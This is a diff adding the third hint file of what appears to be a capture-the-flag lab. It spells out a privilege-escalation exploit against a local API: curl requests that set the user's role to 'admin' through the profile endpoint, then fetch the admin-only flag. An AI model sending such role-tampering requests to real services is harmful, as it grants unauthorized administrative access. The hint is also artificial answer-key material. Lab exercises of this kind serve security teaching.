@@ -1,0 +1,14 @@
+💡 Hint 3: Complete Exploitation
+
+Step-by-step exploitation:
+
+1. Update your role to 'admin':
+   curl -X PUT http://localhost:4002/api/profile -H 'API-Key: alice_api_key_12345' -H 'Content-Type: application/json' -d '{"role":"admin"}'
+
+2. Verify your role changed:
+   curl -H 'API-Key: alice_api_key_12345' http://localhost:4002/api/profile
+
+3. Access the admin-only flag endpoint:
+   curl -H 'API-Key: alice_api_key_12345' http://localhost:4002/api/admin/flag
+
+The flag will be in the response!
